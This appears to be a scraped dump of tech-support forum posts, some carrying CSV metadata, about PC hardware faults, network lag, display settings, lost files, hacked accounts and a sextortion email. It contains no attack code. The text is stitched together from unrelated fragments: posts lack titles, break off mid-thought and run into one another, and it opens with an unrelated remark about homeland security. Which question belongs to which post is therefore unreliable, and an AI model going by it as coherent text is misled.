Something happened and they’re not being fully honest with us. I’ve studied homeland security and this is kind of setting off a lot of alarms for me, “congestion” or not it was still a major event with potentially large security/safety and economic consequences.

bvx7bu,"Occasionally, everything on my computer runs too fast; the computer clock is a bit fast, and I move faster in games.","This is an odd problem that I have been having on my computer ever since my friend built me a new PC several months ago. For some reason, it seems to happen pretty consistently. I will start up my computer, and it will be fine for however long I am on it for (which is usually for a while, since I play video games all day mostly). Then, if the computer goes into sleep mode because I'm not on it for a period of time, this issue will begin to occur, and it fixes itself with a restart. It might also sometimes occur whenever I start up my computer, but this is just what I've noticed.

&amp;#x200B;

To elaborate on what happens in games, it is immediately noticeable, especially in online games. I'll be moving, shooting, building, and everything else at around 1.2x speed, and the server will realize that I'm moving too fast and teleport me back to compensate. This happens around every second. There is also a game that I play that doesn't have too good of an anti-cheat or something similar, so it doesn't teleport me back, giving me a huge unfair advantage.

&amp;#x200B;

I looked this issue up, and didn't see anything on games running too fast, but about the clock moving too fast. Google said it could be an issue of an overclocked processor, so I set the clock speed to default yesterday, but the issue has still occurred to me afterwards. Also, I feel like this isn't really the issue since it doesn't happen 100% of the time.

&amp;#x200B;

Basically, sometimes my computer runs everything at like 1.2x speed and fixes itself on restart. How do I fix this permanently?

bvj6ot,PC shuts down at wrong temperature,"Hi! I recently build a new PC with a Ryzen 2400G. I noticed random shutdowns whenever I did anything that needed a little higher performance. I checked the temperatures with HWMonitor, and I have 2 different temps that I think are the problem.

CPUTIN (which I believe is the MOBO CPU temperature sensor) and the CPU temp itself.

Whenever CPUTIN reaches **40C (104F)** or the CPU reaces **70C (158F)**, the PC shuts down (both reaces the temps the same time). I believe this is not a critical temperature to shut the whole system.

I checked the UEFI temps, the critical is set to 85C for the CPU. Tried disabling MOBO overheating feature, and ran several tests, all ending with shutdown at the temps above.

Anyone has any advice what else can I do?

&amp;#x200B;

\*edit: I use an ASRock B450M Pro4 motherboard.

\*edit: I do not use a GPU, only the APU, but the shutdown happens even if I just run a CPU computing stress test, no graphics.

\*edit: Pics: [https://imgur.com/a/uW4DQvV](https://imgur.com/a/uW4DQvV) (idle; when starting stress; just before shutdown)

&amp;#x200B;

**Summary**, if someone has the same problem in the future:

I found in the UEFI, that an option called *'**Core Performance Boost**'* is set 'Auto' by default, which lets the CPU run over 3.6GHz up to 3.9GHz, making it 1.45V. By turning it off, **I didn't solve the 70C shutdown**, but even stressing the CPU for longer time won't make it reach 70 degrees. (For me, it stopped at 67 degrees, with the default cooler running at 2500 RPM) Let's say it's a kind of victory.

Long story short, I restarted my PC while using GPU 1. The PC never did restart. I tried to see what part was at fault, and sure enough, it was GPU 1. GPU 2 happily runs with ease. Thing is, GPU 2 is one foot in the grave (heating issues), so I can't use it for anything.

&amp;#x200B;

GPU 1, if plugged in and powered up, \*appears\* to run okay. The fan is spinning like normal, and it's making all the noises it normally does. Just like normal. Only it doesn't give me a signal. I'm staring at a blank screen each time I launch the PC using GPU 1. The monitor has a light which is orange when there's no signal, and then it turns blue once it's getting something. With GPU 2, as soon as the PC turns on, I see a blue light. GPU 1? Just orange. Totally unusual. I hope somebody can make sense of this.

&amp;#x200B;

How do I find out what the deal is with GPU 1, and is it fix-able? Or... will I just have to resort to buying a new GPU?

boxfhn,How do I remote control by dad's PC?,"My dad's been suffering from eyesight loss due to surgery complications, so now he can't operate his PC properly anymore. He's literally sitting less than a foot away from a 60"" TV screen the PC is connected to, to operate it using the magnifier Windows tool. 
With that he can manage emails and money issues, but that's it.
Now I don't live in town (or country), but one of my dad's last joys including TV or PC is watching football (European) since he can somewhat follow the red and black dots if he sits close enough. 
Unfortunately he can't afford all these packages they have nowadays, so I've shown him how to live stream things. Unfortunately those pages change a lot and are full of annoying ad popups and sometimes they randomly stop.

I'd like to be able to operate Google Chrome for him from my home so he can just sit there and enjoy 90 minutes of football every once in a while.

bo8q36,Strange smell coming from PC?,"(Fixed) A simple PSU replacement will do the job.

So about a week or two ago my PC started to make my whole room smell odd, I can't really describe what kind of smell it is but:

* It seems to get stronger/released faster when my PC is hot.
* It's not really irritating or anything.
* My PC restarts when it seemingly gets too hot.
* No visible damage on equipment.

I've tried removing most of the dust from my PC, I've looked over the equipment multiple times with no luck.

It seems to me that it comes from around the CPU area or my CPU cooling (air cooling), which leads me to think that the the cooling is insufficient. I took the cooling off today and checked on the CPU chip and nothing is visibly wrong.

So my main question, could it be due to too little thermal paste being there? Any ideas of what it could be?

My home power voltage is 220W, and my brother has an almost IDENTICAL Computer, but works always perfectly (with my same voltage). I tried switching cables and electric socket, but nothing changed.

It is supposed to support 144hz, even with the manufacturer HDMI (tried, still at 120hz)

But I know DisplayPort is the better choice so I got DP cable that is proven to support 1440p 165hz on my friends monitor. But on my PC it still caps at 120hz.

Note: Only 1 cable at time..

Have tried: 

- Monitor own settings are set at 144hz

- Advanced display settings don't show higher than 120hz

- Nvidia control panel I create custom res 1440p 144hz and screen goes black??? This is what I don't understand, is there something I would need to download as there's no reason it wouldn't work correctly when doing this.

I don't know how to continue, would really like for it to work more than 120hz now that I got myself a good PC

EDIT: I sourced back to the manufacturers site for the DP cable, and it is ""1.2"" version. ~~I think this is the problem, I'm proceeding to return the cable and getting a 1.4 one~~. I read online that 1.2 version is capable of 1440p 144hz just fine, just like on others I know

EDIT 2: I have returned the DP cable. It was NON-verified cable, so the most likely scenario was that it was faulty. I have ordered VERIFIED ""3d Cube"" DP 1.4 cable now, as it's verified to be able to do the trick. **HDMI 144Hz is possible** on the manufacturer given cable that came with the monitor -&gt; Can only use 1 monitor as 1x hdmi port on GPU -&gt; need DP cable anyways -&gt; reason why I ordered a new one.

I was still using the DP cable from my 1080 monitor. Take a look at your cables before you go changing a bunch of software settings! Hopefully this helps anyone who just switch to 4k out.

&amp;#x200B;

Hello everyone,

I have been using a 1080p 144hz monitor for a couple months now, and recently switch to a 4k 60hz monitor. However, I know have an issue with the 4k monitor where my mouse will freeze, lag, or otherwise glitch out. The cursor on the screen will- at random intervals- skip a beat/jump/stutter as if it was disconnected/reconnected in the space of a second. During this time, the cursor will repeatedly appear frozen, then unfrozen for a period of 3-5 seconds.

I have this issue whether I'm in a game application, browsing Chrome, or just looking through my files.

I'm currently using a wireless mouse that uses a 2.4 USB receiver.

I have never experienced this issue on my 1080p, so I want to think that it's the new monitor that's the issue.

**My Specs:**

* Ryzen 5 2400g
* Nvidia 1080ti
* 16gb 3200mhz Ram
* Logitech G305 Wireless Mouse

**Things I have tried:**

* Uninstall/Reinstall Mouse Drivers
* Using a different mouse/USB port
* Changed Refresh-rate related settings in Nvidia Control Panel (GSYNC, Freesync, Vertical sync)
* Tried changing to/from HDMI/Display Port
* Checked my CPU/RAM/Storage usage but nothing out of the ordinary
* Virus-scanned
* Changing back to 1080 resolution on the 4k monitor fixes the issue

birq5j,Please help drive D doesn’t show !,"Why the downvotes ?:(

Asking for any help possible please!

Current I am using a g9-593 Acer predator with 2 drives. A 119gb SSD (C:/) and a 1TB (D:/) .

Both of the drives are in good health and windows is on my C:/ drive

Earlier today I get a notification from Intel rapid store technology and I clicked on it and got a popup or something to basically improve my drives such what. I remember I created a new volume called “volume_0000”. I just followed whatever it prompted me to do.

Later the day, couple hours ago I open my laptop. Takes ages to boot so I knew something was up. Turns out all my desktop icons, games etc are all wiped and got a error “Location D:/ users/“ not there. 

I open file explorer, no drive D:/ only C:/. I go to device management no drive D:/, however I had more memory (shown in screenshots below). I open acer health care and it says my C:/ drive now has 238gb (previous 119). However I go back to intel rapid store technology and it shows my drive D:/ with 927 gb as usual. See screenshots below.

Edit:

So I found out my drives are in a raid 0, which I want to remove desperately, I don’t care about my contents in the D:/ drive and want to know the best way to do this. I don’t want to get a new HDD or go into my laptop as I might damage other parts that void warranty. 


Thing is that its an acer model and a search on google tells me that there
is no RAID BIOS because it is locked for acer laptops. Don’t know what to do.

#Basically, how to remove a raid 0 best way possible without harm or damage to my laptop and ensure its safe.

I keep getting some log in from Kentucky on mobile in my log in history. I have two step verification acitvated but I get no permission messages of any one logging into my gmail through my phone? And the worst part is that they are logging in every two or three days which worries me. I only have two devices synced to my Google account (my phone and my PC). I do not use a VPN and when I look at the IP from the log in it's just a bunch of random letters and numbers that don't even resemble an actual IP address (but it tells me it's from Kentucky)

I have also changed my password multiple times and logged my account out of every device after doing so. This is really scary that someone has access to my account just like that and is able to log in and I'm not even getting notified on my two step verification about it! 

Is this a bug with my log in history, or is someone actually having access to my account and passwords? I'm really worried right now, and I don't know how to stop it.

I am using Win 7 Pro.

All my browsers are super slow, i download with 30 kb/s maximum from every site i can imagine (github, microsoft, adobe, nexusmods etc etc) in every Browser i have, also every site loads slow as hell, some gifs need like 4 min buffering. I tried FireFox, Chrome, Vivaldi. However when i update a game on Steam or Battle.net, i have my full 7 MB/s. When i check my speed on speedtest.net i have 7 MB/s down and 1.5 MB/s upload speed. I tried to flush my dns, reset browser cache (Chrome for example i never used, fresh install and its slow as well), change my DNS (tried OpenDNS, Quad9 and Quad1), start in safe mode with networking.

Youtube seems to load normally, at least i dont have any buffering there. Reddit for example is fucked, no pictures load at all or very slowly.

The funny thing is, my browsers are fast again if i use a VPN. I have no clue what causes it and would like to have some insight into this issue and fixed eventually.

//edit: Called my provider, he has no clue, only looked into my router (FritzBox 7362 SL) says everything is ok. I am not using DS-Lite. Doesn't make a difference if i use IPv4 or IPv6 (though IPv6 is now the default, was IPv4 before i went away for 3 weeks).

bgg8mz,I think I killed my GPU,"Yesterday I got a new CPU Cooler, It was a hard fit but I managed to put it on an it was a success, the PC booted normally and the temps were way down. In the process of putting the CPU cooler, the GPU was kinda in the way, I tried to remove it only to find out there was something other than bolts holding it in place, I had no idea what it was and since I bought this ystem from someone else I just pushed the gpu that I had removed slightly from the slot back into it.

&amp;#x200B;

After everything was OK the pc booted normally, I played some games, ran some stress tests, everything was fine. I left my pc running some music yt videos overnight for it to turn off by itself like it always does after some idle time.

&amp;#x200B;

Today I woke up, tried to turn it on to no avail, there was some movement as I could hear my CPU cooler starting but no video was received. I figured it was just windows beign weird, forced a restart. The next time it booted it had some green pixels on the screen, like tearing them, it had happened in the past a couple months ago, but a restart also fixed it, then we are in the current situation, no matter how much I restart my computer won't properly recognize my gpu and windows will un in a lower res. By looking into device manager it says the GPU has a problem and didn't start. I assume it's working minimally as I'm using a Xeon CPU with no Integrated Graphics. Right now It looks like when you have no drivers installed, I can only use windows at 1280 x 720.

&amp;#x200B;

I'm currently running Windows 10, with a Xeon X3470, a GTX 960 4GB, a POS-PIH55BO motherboard (Basically a  PCWare IPM H55  with a different BIOS), and 8GB of ram.

I accidentally deleted the folder, all subfolders and files within began to delete, and I stopped the deletion after 37% of the deletion was completed. The main folder still remains but 1/3 of the data is gone. Help!","Hi,

So I'm in a very bad situation here. I tried to lock my Windows 10 computer by hitting ctrl+alt+delete and I must have accidentally had a folder on my desktop with at least 50-100 gigabytes of files in it selected and I must have screwed up the screen lock command and hit 'delete' and instantly the folder with all of these gigabytes in it began to permanently delete. Yes, I know that you are asked if you are sure you want to delete the folder and it appears that I mistakenly, in a split second, hit 'enter' or 'yes' without realizing what I did. The files within this folder and the files within this large folder's subfolders began to delete very quickly and I was able to stop the deletion but the deletion completed about 37% of the way. 

Examining what was deleted it looks like I lost a ton of files and folders. 

If anyone can help me retrieve these permanently deleted files and folders it would mean so much to me. I'm very afraid that I lost files that had deep sentimental and actual value to me and I absolutely need to restore the files and folders. 

If there is any information that anyone wishing to help might need in order to aid me in successfully restoring the permanently deleted files and folders, please let me know. 

If it helps, I have a 4 terabyte external hard drive, another laptop that works perfectly well, and a 128GB USB flash drive at my disposal for potential data recovery.

Thank you so much in advance.

Also, I know that I shouldn't have stored such a large amount of files and gigabytes in a single folder but it is something I did just days ago to clear up my desktop and computer and unfortunately I made a horrible mistake not long after doing this.

bf0j7l,Just moved into new apartment. Router has this weird connection where one CAT cable is split into two RJ45 connectors.,"So the apartment has internet access via a RJ45 wall socket. The CAT cable that connects to wall socket splits into two. one connector connects to the WAN port and the other to one of the LAN ports.

I can't understand why would they do this? If I pull out the either one of the cable, the internet doesn't work anymore.

I would like to use my own gigabit router with WAP, how can I do it?

&amp;#x200B;

Edit (update): Thanks for all the help guys. I still unfortunately can't figure it out completely yet. I was told by the person who manages the building that I can't access the 'other side' of the network (patch panel etc). This is the way it is setup and I must use it like that.  To be honest she is a purely non-technical person and she is annoyed if the internet is working then what is the problem. The internet is included in the rent. The building doesn't have any other cable etc provider. This is in Far east asia. 

1. When I disconnect the cable on the LAN port, all the devices are obviously still connected but the internet is not accessible. However I still get assigned a DHCP ip address. 
2. The device is a router + WAP + switch.  The split cable is definitely not ending any where in my apartment (as far as I can tell). Wifi is via SSID provided by this router and there is no other AP. 
3. When I connect my laptop to one of the LAN ports, I get 192.168.1.x IP address. [192.168.1.1](https://192.168.0.1) resolves to this local router in my apartment. The router user name / password isn't know to me. Typical combinations of admin user root don't work. 
4. When I connect the router's WAN and the wall RJ45 socket with a normal Ethernet cable, the router WAN light turns ON When I connect my laptop to one of LAN ports, the connection is made but all I can do is pull up the webUI for this router. I can't access the wider internet. 
5. When I connect the laptop directly to the RJ45 connector for the WAN port. I don't get an IP address DHCP. I tried to set static IP address 192.168.0.x or 192.168.1.x or 10.0.0.x but it doesn't seem that anything is on these subnets.

I've had to restart my PC several times, and it's kept coming back.  However, there is one thing that has happened to me as well.  I've had a BSOD happen.  Luckily, I was able to snag the error code in time.

Error Code:  WHEA\_UNCORRECTABLE\_ERROR

I've looked it up, I've tried everything to help it, but I can't seem to do anything about it.  I really need some help here, since I kinda just got this system and for pretty cheap.  I have rebuilt it once before, but I have no clue what to do.

Thanks for your help in advance.  


EDIT:  I tried a couple of things to fix it myself, like swapping network adapters (It was loose when I put it in at first) and slots, but that didn't work.  Just now, I had opened my PC and discovered that my stick of RAM wasn't fully seated.  Thank you for all of your help!

They told me they monitor can't be fixed so they will refund me the price of the monitor. This was several months ago.

bageqg,"Received a “Shut up and dance” e-mail, just wanted to share and ask if there’s anything to worry about!","I never thought I’d receive this, but just wanted to be sure. Throwaway acc ofc.

Here’s the message, and the contact info:
https://imgur.com/a/CirUbst

First off, I watch my porn for free on Pornhub like any other regular human being. No “teen porn” or whatever.

Second, I watch it 99.9% of the time on my desktop PC with no webcam, if I ever watch on my phone, it’s on my iPhone whose camera can’t be accessed without my permission.

Third. This was sent to my business email which I never use for anything except for speaking to my clients. I don’t use it for any account logins, literally for anything except for talking to my clients. I even have a dedicated email address which I specifically use for spam emails and for my Pornhub login. But that business email is the only public email of mine because I have a website for my business and the email address is in the description of every youtube video I upload. I’m a small youtuber with less than 1K subs, but still, it’s there publicly so anyone can get it.

I also don’t have any contacts associated with that e-mail. Since I just use the official Mail app on iOS to access the address and the official Mail app on my Windows PC.

And lastly, the email suggests that they KNOW I have $2000 but if they’re such good hackers, they’d know I have around $20 in my bank account lol

My website and email address is hosted by HostGator if that helps in any way.

b8cer3,"At my wit's end with internet lag, driving me crazy and draining my wallet","I'm on Windows 10 Professional, on a modest custom built gaming desktop that I've been using for a long time now, but the problem is not limited to my computer. It's also on my Xbox and my Roku devices.

I am connected to the internet, but I am experiencing lag and sudden but brief disconnects on all devices. My ISP has been out to my location and says everything is fine on my end, everything is coming through just fine and I am plugged directly into the node. I just went out tonight and bought a brand spanking new modem/router, the best one I could get my hands on (Netgear AC1750/C6300), and my ping in-game has improved by a small percentage but I am still experiencing lag and some disconnects!  I even bought all new cables for it; both the coaxial cable and the ethernet are the best that money can buy. It's precisely what all the publications recommend.

This is a new problem. My internet has been fine for years, 100Mbs coming down the pipeline just fine, right up until a couple weeks ago. I really didn't want to spend the money I did on this fancy modem, but I did with the reassurance that I was putting the ultimate fix towards any internet problems I might be having. Again, it's not a speed problem, it's my latency. My latency in online games skyrockets through the roof at random but brief intervals, and I am totally disconnecting from online games at random times.

My last post got no visibility, and I am frustrated to tears about this honestly. It's threatening the loose bond I maintain with my online friends because I can't stay connected in games. Any and all advice is appreciated, I've done everything I know how to do so far but I am a novice at these things anyway.

I'm using the stock DisplayPort cable that came with the monitor. I also have secondary monitor hooked through displayport (NOT 4k, 1080p 144hz over displayport. I'd guess it isn't HDCP 2.2.)

Windows 10 Home edition.

Netflix runs at 1080p exclusively. I've also run this ""cyberlink ultra HD blu ray advisor"" software, and it reports [these](https://imgur.com/a/7XenoyI) results. I'd appreciate any help!

SOLVED! The solution, in my case, was to unplug my second monitor (which is not compliant with Netflix requirements) and connect the 4k monitor to my graphics card (10 series invidia or higher, not sure for AMD.) via an HDMI cable. Display port didn't work for me, unfortunately. You can ONLY get 4k on Edge Browser or the netflix application on Windows 10. You can hit ctrl shift alt Q to show your stats and see if you're truly pulling 4K.

b14pgd,I've been hacked! Never seen a story like this!,"Hello Reddit,

Tl;dr:
Amazon account compromised, now getting hundreds of account confirmation emails as well as ticket submissions to sites I've never visited.

I got hacked today, and it's left me feeling very confused.

My first heads up was when I woke up, I had a couple  emails in my notifications from different sites with the standard account confirmation links. Thing is, I didn't sign up to any of them. Weird, but I have to get ready for class so I'll just deal with it later.

Then maybe an hour ago, I got a notification from Amazon that one of my orders payments got declined. Immediate heart racing as I haven't made an order in a week. Low and behold, there was a $812 projector ordered off of my Amazon at 5:47am and shipped to a person of my same name in tennesee (I'm in the north east).

So for sure the hacker got access to my Amazon account. I went through the standard motions, changed the password, removed all payment methods (he must of used an expired method), and called Amazon to place my account on hold. They suggested I change my email password as well.

Here's where I'm left feeling confused. I'm no stranger SQL injection, I'm assuming that I used my same email/pass combo on some insecure server that guy hacked, and now he's running wild and got a hit on my Amazon. Thankfully I had the insight to not use that same password for my email. As far as I know, my email (gmail) has not been compromised.

So the weird part is that from last night, until about an hour ago, I have probably 150 different account confirmation emails from sites I never signed up for. They're coming in such quick succession it almost makes me think he's using an automated script. Also, I have multiple emails from some of these sites responding to support tickets he submitted to the sites.

What's the angle? Why is he using my email to sign up for all of these services? It would literally take me weeks to reach out to all these sites. What should I do next. Did a quick Google search, and I've never even heard of this, so any advice is better than I've got.",https://www.reddit.com/r/techsupport/comments/b14pgd/ive_been_hacked_never_seen_a_story_like_this/,1552592232.0,123,0.98,55,techsupport,thatsnotnorml

( I edited the MAC IDs to XXXX and YYYY for this post.  They were both properly formatted in the original message.  I'm not sure why, but I'm a little uncomfortable posting my router's MAC on reddit).  The first MAC matches my Arris modem The 2nd one doesn't match any device of mine.

Based on this, I'm pretty sure my router is fine, and it's either my modem or the ISP itself.

I've tried the obvious of turning it off and back on again, and unplugging and replugging, but that's about all I can see to do on the modem. As far as I can tell, Arris firmware isn'tavailable to download for consumers.

The only settings in the arris control panel are:

Downstream Frequency: 639000000

Upstream Channel ID: 50

Downstream Frequency Plan :NorthAmerica

We had this once before (long before I worked here) and they apparently had an issue with them looking at adult content in public.

I know how to prevent them from looking at adult content but I was looking at finding a way to do two different things at the same time. I want to set it up so that they would have to log in using their name, or an ID number, or something similar, or just something that will keep a log of who used the computer and when. I also wanted to set up a timeout system that only allows the use for a specific time so that they are forced to share.

&amp;#x200B;

If it helps there are 194 apartments, but I suspect only 20-30 would use them ever.

&amp;#x200B;

I don't know how to go about doing both of these in the most efficient manner, and would greatly appreciate some help.

My little siblings have been addicted to fortnite for the past 6 months and it’s getting way out of hand now that I need to study for my upcoming SAT’s. Combined they play over 8 hours daily. I want to block Fortnite on the computer. I was thinking of removing permissions from all users to Epic Games Launcher and then setting the Launcher to Hidden, but after testing with other applications it seems you can just re install the application. I either need to block the epicgames url from the browser so they can not re download Epic Games after i remove permissions and set to hidden, or find a more permanent way to block the application without it being able to be reinstalled from the website.

Thank you guys so much for the help in advance this has been a big problem that I can’t seem to solve 🙏

Edit: Woah just checked this post after a couple hours thanks for all the feedback. I ended up trying to block Epic Games via the firewall but for some reason it wouldn’t work. I knew i was doing it right because other apps i tried it on actually became blocked. So I messed around with all the permissions and now Epic Games doesn’t even open when I click it and when I try to re download it says insufficient permissions. So basically it worked but I have no idea how to fix it in case I need to. Parents haven’t found out but lets just say when they do OP might be getting a spanking ⚰️☠️

Edit: Thanks for all the replies guys, I really appreciate it. If I haven't answered your question, chances are I've answered it somewhere else or I've tried what you suggested. I'm planning on calling Gigabyte support tomorrow and if that doesn't get me anywhere I might just have to take it in for repair at Micro Center or something. (Not really something I can afford but running out of options.) I'll be sure to keep you guys updated if it works out and try to answer some more questions. 

So I had a classic water accident and after drying out for a day my PC would turn on, all fans would spin, but it wouldn't post. After powering on, it restarts immediately, then stays on for about 15 seconds before restarting again, while never giving my any BIOS or post. The only way to stop the loop is to switch the power off on the PSU itself. After extensive troubleshooting I decided to go ahead and upgrade my motherboard and processor as they were a likely culprit. After they arrived, no dice, same issue. I made extra sure I was following all installation steps correctly. I borrowed some new RAM to see if that was the issue and still the same problem. I had tested the voltages of my 500W power supply and they all looked fine, but I swapped in a new 600W just in case. After no luck, I took my rig in to Geek Squad and they said the only thing the could think of was a problem with the case itself. I ordered a new case, installed all the components to the best of my ability and, you guessed it, same exact problem. Before you ask, I've tried reseating components multiple times, and I've tried resetting CMOS. I'm at my wit's end at this point as I'm now falling behind on a lot of school projects as I am a full time online college student, so any ideas for solutions would be great.

auob9l,"ISP is too incompetent to solve a packet loss issue, how can I help them?","After like the 7th visit by different 'technicians' , the latest response was "" well... we'll get back to you! :) ""

Often they take upwards of an hour each visit 'diagnosing' with no solution in sight, often at work hours which I rather not waste.

According to them, the packet loss happens when the data (is that the right word here?) hops from a private IP to a public one (all owned by the ISP).

This is what mtr shows

traceroute to blizzard's US servers

The public one then connects to a server from a bigger ISP.

The problem is the public IP owned by my ISP. It often drops around 10 - 20% of packets.

If I'm gaming, I see players teleporting all over the map.

There are also a lot of ping spikes, which may be a side effect of the packet loss.

They also tried switching from one big ISP server to some other but that didn't fix anything.

&amp;#x200B;

So my question, is there anything I can do to help them diagnose the problem?

au8n72,Is it normal for a laptop to be slow when not plugged in.,"I tested my Laptop on user benchmark. Every time when it is not charging it shows really bad results and is therefore slow, but as soon as i plug it in the results become really good. Is this normal or is my laptop faulty. Battery is set to max performance on both battery and charging. The laptop had 85% battery when I ran the tests when it was not plugged in.

Solved : It seems that this is normal as a lot of you said that the laptop goes to a different state when it is not plugged in (wasn't aware of that as it is my first laptop) . I asked the guy who bought it for me as he has a similar laptop and said that it is normal for it to be slower at more intense tasks if it is not plugged in.

atj9t9,Is my house killing my Graphics Card?,"Hi guys! I'm really scratching my head with this one.

&amp;#x200B;

While playing games I was getting weird restarts with a message saying ""Power surges detected during previous power on. ASUS Anti-Surge was triggered to protect system from unstable power supply unit"". This only happened when the PC was displaying in-game graphics or doing GPU benchmarks.

&amp;#x200B;

I replaced the power supply but it was still happening. Then I plugged my old PSU back in and I heard sparks and smelled a sulpher like smell that seemed to be coming from the GPU. My PC wouldn't start but when I took out the GPU it started just fine. The name on the card wasn't even lighting up anymore so I RMA'd the card back to EVGA. Well this morning I got a replacement card and the same thing happened again. I got about 20 minutes of gaming and got a shut down. The PC is no longer starting up when the GPU is installed but starts up just fine without it. I tried the other PCI slot but the card seems to be completely dead. The lights don't turn on on the card anymore either.

&amp;#x200B;

I have a surge protector but I should also note that a laptop blew and died about a month ago from a different socket and I've only been living here since December 1st. I started having my PC problems about a week or two after moving in. The people living here for 4 years before me say they never had any electronics blow. There are no obvious signs on damage on any of the components.

Specs:

ASUS Z170 Pro Gaming Motherboard

i7 6700k CPU with NZXT Kracken X62 watercooler

GTX 980ti (original and replacement)

EVGA 850w GQ PSU

16GB Corsair Vengeance RAM

500GB M.2, 250GB SSD, 1TB HDD

I just want to know what could cause this, I can go for a long time (months) with no issues but then I will start getting random disconnects (that roughly happen once or twice a day) it is definitely the router and not my pc.  

When I thought it was just the 5ghz band I was told it was a range issue but now that I know it's the router itself it can't be a range issue. 

From my limited knowledge I could guess it's because I don't reset the router often but resetting the router doesn't actually stop the problem happening so I don't know what it could be.

I also sometimes experience high ping randomly (usually on start up) but I can just fix that by disconnecting my pc from the internet and reconnecting.

* Clock speed never drops below the ""normal""~~

~~Effect: Start up a game, any demanding game i've tried so far (Let's say The Witcher 3, since ive tried that a few times now) and the FPS is normal, what you'd expect for a 1080 Ti. Then over the course of a minute or two, it drops to 60 FPS, then down to 30. This is assuming graphics are on ""High"" preset. Changing to the low preset makes the graphics drop down to around 36-38. This new ""performance"" persists until the computer is restarted. It persists through to other games too, including GTAV, Shadow of War, Monster Hunter World. It doesn't matter what game I start with, the fps drop seems inevitable, though the more demanding the game, the sooner it seems to happen.~~

I am using hp pavilion dv6-6b00st notebook. It has Radeon HD 6490M and Intel i5-2430M. Running dual-boot W7 and Ubuntu 16.04. Today on W7, it freeze. Couldn't get any response. Closed and tried rebooting, its screen was black beyond loading screen. Removed GPU drivers and reinstalled, nothing changed. Tried to boot Ubuntu, but it freeze at log screen. When i disabled discrete GPU at both of them, i could boot with success. No recent driver update/new program installed. Can we say GPU is dead? Any tips to revive it?

Update: It was working fine after i deleted discrete GPU's drivers. Last day screen went black, screen was working (because i could change brightness) but there was no image. Windows and Ubuntu can boot but no image on screen. Later on it started to work again, fine image on the screen. But today it went black again, and there were distorted images. I don't have any external monitor to try. I boot safe mode but no image on screen. Does this mean integrated GPU is dead too?

I am now in the process of moving AGAIN and I will not have access to Ethernet in my new set up. I have tried many wifi adapters, I even invested in a [expensive](https://www.newegg.com/Product/Product.aspx?Item=9SIA85V7WH7653) at one point and each of them have had their issues. The biggest issue I have is stability. I am pretty confident the issue is the fact that the USB ports aren't pushing consistent power to the wifi adapter and it is causing spikes in coverage which become annoying, especially while online gaming. I know of Wifi extenders and Wifi Routers that have Ethernet ports that I can use as extenders. What is my best option?

9fo9zx,Might be a Stupid question. Can websites track to see if you are inspecting/reading the page source (right click/inspect)?,"Throw away account BTW. I know you’re going to want to know why. My school has weekly tests that are very hard on the grades. (you fail one &lt;76% and you have a good chance of not passing the course). We take tests through a website that the school partners with. The school updated their policy last year that test scores will no longer be released right away (for some random ass reasons). So sometimes we wait until the afternoon or up to 7 days before we find out what we scored. This also can lead to not knowing if your studying is working because you might be taking the next test by the time you find your score.


Here's an example of what the results page looks like after you have taken a test if the results are hidden. (they are not always hidden)


TEST NAME ------- DATE COMPLETED------INDIVIDUAL SCORE


AAA222		09/13/2018			Results disabled by instructor


Here is what it looks like if they are not hidden 


TEST NAME ------- DATE COMPLETED------INDIVIDUAL SCORE


AAA222		09/13/2018			95.0%


About 4 months ago someone figured out that you can inspect the page source and find out what you scored in the code. The school has somehow caught on to this and is constantly changing this code to make it harder but whatever they do doesn’t matter because you can always find out where they hid the score. 


Here is where my question matters. There is a fat rumor that they have suspended a couple students for looking up their scores and that if they catch you they will also suspend you. Can they even tell if you look at the code or are they blowing smoke?",https://www.reddit.com/r/techsupport/comments/9fo9zx/might_be_a_stupid_question_can_websites_track_to/,1536892100.0,105,0.98,82,techsupport,651984651984

Can’t get laptop turned on now [Windows 10],"**Solution** So, I opened up the computer to check the battery (somehow only broke one clip), and as /u/fuzzyspudkiss suggested, the ribbon cable connecting the power button to the motherboard has come detached. Put it back in place, and now we’re up and running again! My guess is he fucked it up by opening the computer, got scared, and tried to blame it on a “what’re the chances???” software problem. Thanks for everyone’s help and suggestions. As an aside, I chewed my roommate out and he bought me two sushi rolls for dinner tonight!

I’ll be straight up. I’m not naturally inclined towards computers, but I can usually figure things out with a bit of reading. I’m totally stumped on this one though. 

My roommate just got a job in IT, and loves messing with computer shit. I was complaining about a sluggish laptop, and he asked me if I wanted him to “tune up” my laptop. I said sure (that was fucking stupid). 

I don’t have a clue what he did or how he got to disabling buttons and keys and shit, but he someone got the main power button disabled. He also left the laptop sitting out over night without a charge without turning the switch back on. I guess it was low enough on battery that it went into hibernation/died. 

Anyway, I can’t get it to do anything without that button. I’ve tried hooking it up to my desktop, but because it was a budget Dell, the only possible connection was either HDMI or USB, and since the computer is off, neither of those were helpful. 

Any ideas?

9cu67g,My business's long CAT5e cable is recognized by the old 10/100 router but not the new gigabit router &amp; switch.,"I'll cut to the chase: 

* There are two buildings at my work place and they both run off the same internet connection that resides in the building we will call B1. 
* In B1, there is a workstation which hosts the database to a vital software for the business.
* Building 2 (B2 from here on out) is connected to B1's internet via a roughly 200' CAT5e cable which runs partially underground from B1 to B2. 
* That ethernet cable connects to an older Netgear router (sorry, I don't have the model number available at the moment) which has 10/100MB ethernet ports. The connection type is as an AP.
* That router recognizes the cable from B1 to B2 and provides internet to B2. 
* A new router, which provides gigabit ethernet speeds, was purchased to replace the old router in B2. This was done because our database software support told us that higher bandwidth would improve the user experience, which at times will slow to a crawl.
* The new router did not detect the ethernet connection from the cable that connects to the main router in B1. 
* An additional test with a gigabit switch also failed to produce recognition from said cable.

Basically, I absolutely need this new router to work but I cannot for the life of me figure out why it is not able to notice the connection. I tried it from the router in B1 with a 6"" cable and it worked perfectly. Replacing the long cable is an absolute last resort. The fact it is able to work with the 10/100 router suggests to me that it is not cable issue. I could be completely wrong about that though.

When I turned it on, the speaker and microphone weren't working and touchscreen was constantly randomly pressing different areas of the screen. I've let it spend the night in a bag of rice in vacuum packing. Tomorrow both microphone and speaker started working again but touchscreen was still pressing different parts of the screen. It's been 3 days and it still does the same. Sometimes when I use it, it works ok for some minutes and then starts pressing random parts of the screen. Sometimes it's so bad I can't do anything because the presses are too fast.

I am not sure if water got between touchscreen and LCD or there is salt left. Anyone has any ideas of what can I do to repair it? Wait a bit longer or soak the phone in distilled water or replace the touchscreen?

About a year ago I had an ingenious idea to clean the phone with alcohol. Some of it got between touchscreen and LCD, dissolved the glue that holds it together and made a small area on top part of the phone ""stained"". I presume that's where the seawater got in.

I presume water got either between digitizer and LCD or to the touchscreen port.

